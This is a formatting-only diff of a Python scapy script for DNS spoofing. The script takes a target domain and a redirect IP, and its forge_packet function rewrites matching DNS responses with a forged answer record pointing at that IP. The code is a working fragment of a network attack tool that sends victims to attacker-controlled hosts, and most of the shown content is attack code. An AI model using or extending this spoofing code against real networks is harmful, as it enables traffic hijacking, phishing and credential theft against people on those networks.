@@ -7,13 +7,21 @@ import argparse
 
 def get_args():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-d", "--domain", dest="domain", help="Specify a domain to spoof")
-    parser.add_argument("-r", "--ip", dest="ip", help="Specify IP address to redirect to")
+    parser.add_argument(
+        "-d", "--domain", dest="domain", help="Specify a domain to spoof"
+    )
+    parser.add_argument(
+        "-r", "--ip", dest="ip", help="Specify IP address to redirect to"
+    )
     values = parser.parse_args()
     if not values.domain:
-        parser.error("[-] Please specify a domain to spoof, use --help for more information")
+        parser.error(
+            "[-] Please specify a domain to spoof, use --help for more information"
+        )
     if not values.ip:
-        parser.error("[-] Please specify IP address to redirect to, use --help for more information")
+        parser.error(
+            "[-] Please specify IP address to redirect to, use --help for more information"
+        )
     return values
 
 
@@ -23,7 +31,7 @@ def forge_packet(scapy_packet):
     qname = scapy_packet[scapy.DNSQR].qname
     # If the query name is our target domain,
     # modify the DNS sent IP address with IP address in arguments.
-    if options.domain+'.' == qname.decode():
+    if options.domain + "." == qname.decode():
         print("[+] Spoofing Target")
         answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
         scapy_packet[scapy.DNS].an = answer
